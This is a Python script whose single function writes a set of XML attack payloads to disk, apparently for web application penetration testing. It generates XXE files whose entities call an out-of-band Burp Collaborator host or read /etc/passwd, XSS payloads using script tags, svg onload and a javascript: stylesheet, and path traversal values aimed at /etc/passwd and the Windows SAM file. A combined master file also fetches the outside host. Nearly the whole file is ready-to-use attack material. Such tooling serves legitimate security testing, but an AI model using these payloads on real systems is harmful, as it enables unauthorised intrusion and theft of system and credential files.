from pathlib import Path

def generate_xml_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    xss_dir = output_dir / 'xss'
    xss_dir.mkdir(exist_ok=True)
    path_traversal_dir = output_dir / 'path_traversal'
    path_traversal_dir.mkdir(exist_ok=True)
    
    xml_xxe1_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-1">
]>
<root>
<data>&xxe;</data>
</root>'''
    with open(xxe_dir / "xxe1_entity.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xxe1_entity)
    
    xml_xxe2_https = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe-xml-2">
]>
<root>
<data>&xxe;</data>
</root>'''
    with open(xxe_dir / "xxe2_https.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xxe2_https)
    
    xml_xxe3_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<data>&xxe;</data>
</root>'''
    with open(xxe_dir / "xxe3_file.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xxe3_file)
    
    xml_xxe4_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-xml-4">
%xxe;
]>
<root>
<data>test</data>
</root>'''
    with open(xxe_dir / "xxe4_parameter.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xxe4_parameter)
    
    xml_xxe5_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-5">
]>
<root>
<data>&xxe;</data>
</root>'''
    with open(xxe_dir / "xxe5_doctype.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xxe5_doctype)
    
    xml_xss1_script = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<script>alert(1)</script>
</root>'''
    with open(xss_dir / "xss1_script.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xss1_script)
    
    xml_xss2_cdata = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<data><![CDATA[<script>alert(1)</script>]]></data>
</root>'''
    with open(xss_dir / "xss2_cdata.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xss2_cdata)
    
    xml_xss3_svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<rect width="100" height="100" fill="red"/>
</svg>
</root>'''
    with open(xss_dir / "xss3_svg.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xss3_svg)
    
    xml_xss4_stylesheet = f'''<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet href="javascript:alert(1)"?>
<root>
<data>test</data>
</root>'''
    with open(xss_dir / "xss4_stylesheet.xml", 'w', encoding='utf-8') as f:
        f.write(xml_xss4_stylesheet)
    
    xml_path1_relative = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<file>../../../etc/passwd</file>
</root>'''
    with open(path_traversal_dir / "path1_relative.xml", 'w', encoding='utf-8') as f:
        f.write(xml_path1_relative)
    
    xml_path2_windows = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<file>..\\..\\..\\windows\\system32\\config\\sam</file>
</root>'''
    with open(path_traversal_dir / "path2_windows.xml", 'w', encoding='utf-8') as f:
        f.write(xml_path2_windows)
    
    master_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-master">
]>
<root>
<data>&xxe;</data>
<script>fetch('{base_url}/xss-xml-master')</script>
<file>../../../etc/passwd</file>
</root>'''
    with open(output_dir / "master.xml", 'w', encoding='utf-8') as f:
        f.write(master_xml)
